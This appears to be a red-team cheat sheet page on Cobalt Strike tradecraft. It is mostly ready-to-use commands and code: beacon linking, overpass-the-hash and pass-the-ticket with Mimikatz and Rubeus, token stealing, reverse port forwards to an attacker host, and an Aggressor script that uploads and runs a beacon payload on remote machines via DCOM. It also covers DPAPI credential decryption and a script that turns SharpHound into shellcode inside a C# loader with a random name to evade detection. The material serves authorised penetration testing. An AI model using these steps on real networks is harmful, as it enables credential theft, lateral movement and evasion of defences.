# Cobalt Strike

- [https://www.cobaltstrike.com/support](https://www.cobaltstrike.com/support)
- [https://www.cobaltstrike.com/aggressor-script/functions.html](https://www.cobaltstrike.com/aggressor-script/functions.html)
- [https://reconshell.com/list-of-awesome-cobaltstrike-resources/](https://reconshell.com/list-of-awesome-cobaltstrike-resources/)
- [https://github.com/S1ckB0y1337/Cobalt-Strike-CheatSheet](https://github.com/S1ckB0y1337/Cobalt-Strike-CheatSheet)
- [https://github.com/rsmudge/Malleable-C2-Profiles](https://github.com/rsmudge/Malleable-C2-Profiles)
- [https://github.com/threatexpress/malleable-c2](https://github.com/threatexpress/malleable-c2)




## P2P Beacons

Beacon TCP and Beacon SMB are Peer-to-Peer beacons which means they're used to chain a connection to an existent beacon. They act like bind shells and waits for the attacker to connect to them.

Connect to a TCP beacon:

```
beacon> connect <IP> <PORT>
```

Connect to an SMB beacon:

```
beacon> link <IP>
```




## Overpass-the-Hash

More opsec PtH than builtin `pth` command (which does the Mimikatz `sekurlsa::pth` thing with named pipe impersonation):

```
beacon> mimikatz sekurlsa::pth /user:snovvcrash /domain:megacorp.local /ntlm:fc525c9683e8fe067095ba2ddc971889
beacon> steal_token 1337
```

Same with Rubeus (must be in elevated context):

```
beacon> execute-assembly Rubeus.exe asktgt /user:snovvcrash /domain:megacorp.local /aes256:94b4d075fd15ba856b4b7f6a13f76133f5f5ffc280685518cad6f732302ce9ac /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
beacon> steal_token 1337
```

Use Rubeus with lower privileges:

```
beacon> execute-assembly Rubeus.exe asktgt /user:snovvcrash /domain:megacorp.local /aes256:94b4d075fd15ba856b4b7f6a13f76133f5f5ffc280685518cad6f732302ce9ac /nowrap /opsec

PS > [System.IO.File]::WriteAllBytes("C:\Windows\Tasks\tgt.kirbi", [System.Convert]::FromBase64String("<BASE64_TICKET>"))
Or
$ echo -en "<BASE64_TICKET>" | base64 -d > tgt.kirbi

beacon> run klist
Or
beacon> execute-assembly Rubeus.exe klist

beacon> make_token MEGACORP\snovvcrash dummy_Passw0rd!
beacon> kerberos_ticket_use C:\Windows\Tasks\tgt.kirbi
```




## Pass-the-Ticket

Create a sacrificial process, import the TGT into its logon session and steal its security token:

```
beacon> execute-assembly Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
beacon> execute-assembly Rubeus.exe ptt /luid:0x1337 /ticket:<BASE64_TICKET>
beacon> beacon> steal_token 1337
```




## Pivoting

Make any traffic hitting port **8443** on Victim to be redirected to **10.10.13.37** on port **443** (traffic flows through the Team Server):

```
beacon> rportfwd 8443 10.10.13.37 443
```

Make any traffic hitting port **8080** on Victim to be redirected to **localhost:8080** on Attacker (traffic flows through the CS client):

```
beacon> rportfwd_local 8080 127.0.0.1 80
```

Extending `jump` with [Invoke-DCOM.ps1](https://github.com/BC-SECURITY/Empire/blob/master/empire/server/data/module_source/lateral_movement/Invoke-DCOM.ps1):

```powershell
sub invoke_dcom
{
    local('$handle $script $oneliner $payload');

    # acknowledge this command1
    btask($1, "Tasked Beacon to run " . listener_describe($3) . " on $2 via DCOM", "T1021");

    # read in the script
    $handle = openf(getFileProper("C:\\Tools", "Invoke-DCOM.ps1"));
    $script = readb($handle, -1);
    closef($handle);

    # host the script in Beacon
    $oneliner = beacon_host_script($1, $script);

    # generate stageless payload
    $payload = artifact_payload($3, "exe", "x64");

    # upload to the target
    bupload_raw($1, "\\\\ $+ $2 $+ \\C$\\Windows\\Temp\\beacon.exe", $payload);

    # run via this powerpick
    bpowerpick!($1, "Invoke-DCOM -ComputerName $+ $2 $+ -Method MMC20.Application -Command C:\\Windows\\Temp\\beacon.exe", $oneliner);

    # link if p2p beacon
    beacon_link($1, $2, $3);
}

beacon_remote_exploit_register("dcom", "x64", "Use DCOM to run a Beacon payload", &invoke_dcom);
```

Forward SOCKS server's port from team server to the client:

```
beacon> socks 1080
$ ssh -tt -v -L 9050:localhost:1080 root@teamserver
```




## Credentials



### DPAPI

List credential blobs:

```
beacon> ls C:\Users\snovvcrash\AppData\Local\Microsoft\Credentials
```

List vault credentials:

```
beacon> run vaultcmd /listcreds:"Windows Credentials" /all
beacon> mimikatz vault::list
```

Check which master keys correspond to credential blobs (look for **guidMasterKey** field with GUID):

```
beacon> mimikatz dpapi::cred /in:C:\Users\snovvcrash\AppData\Local\Microsoft\Credentials\<BLOB>
```

The master key is stored here:

```
beacon> ls C:\Users\snovvcrash\AppData\Roaming\Microsoft\Protect\<SID>
```

Decrypt the master key via RPC on the Domain Controller and show it:

```
beacon> mimikatz dpapi::masterkey /in:C:\Users\snovvcrash\AppData\Roaming\Microsoft\Protect\<SID> /rpc
```

Decrypt the blob with decrypted master key:

```
beacon> mimikatz dpapi::cred /in:C:\Users\snovvcrash\AppData\Local\Microsoft\Credentials\<BLOB> /masterkey:<MASTERKEY>
```




## BloodHound

* [https://github.com/l4ckyguy/ukn0w/commit/0823f51d01790ef53aa9406f99b6a75dfff7f146](https://github.com/l4ckyguy/ukn0w/commit/0823f51d01790ef53aa9406f99b6a75dfff7f146)

Grab the latest version of [SharpHound.exe](https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.exe), convert it to a shellcode with donut, insert bytes in a C# skeleton and cross-compile it for use in Windows with [Mono](https://linux.die.net/man/1/mcs) compiler:

{% code title="sweetblood.sh" %}
```bash
RNDNAME=`curl -sL https://github.com/penetrarnya-tm/WeaponizeKali.sh/raw/main/misc/binaries.txt | shuf -n1`
wget https://github.com/BloodHoundAD/BloodHound/raw/master/Collectors/SharpHound.exe -qO /tmp/SharpHound.exe

# --ldapusername snovvcrash --ldappassword Passw0rd!
~/tools/PEzor/deps/donut/donut -a2 -z2 -i /tmp/SharpHound.exe -p '--CollectionMethod All,LoggedOn --NoSaveCache --OutputDirectory C:\Windows\Tasks --ZipFilename sweetbl.zip' -o /tmp/SharpHound.bin

BUF=`xxd -i /tmp/SharpHound.bin | head -n-2 | tail -n+2 | tr -d ' ' | tr -d '\n'`
BUFSIZE=`xxd -i /tmp/SharpHound.bin | tail -n1 | awk '{print $5}' | tr -d ';\n'`

cat << EOF > "/tmp/$RNDNAME.cs"
using System;
using System.Runtime.InteropServices;

namespace Sh4rpH0und
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, ulong dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        static void Main(string[] args)
        {
            byte[] buf = new byte[$BUFSIZE] { $BUF };
            IntPtr addr = VirtualAlloc(IntPtr.Zero, (ulong)buf.Length, 0x1000, 0x40);
            Marshal.Copy(buf, 0, addr, buf.Length);
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
EOF

mcs -platform:x64 -t:winexe "/tmp/$RNDNAME.cs" -out:"$RNDNAME.exe"
file "$RNDNAME.exe"
rm "/tmp/SharpHound.exe" "/tmp/SharpHound.bin" "/tmp/$RNDNAME.cs"
```
{% endcode %}
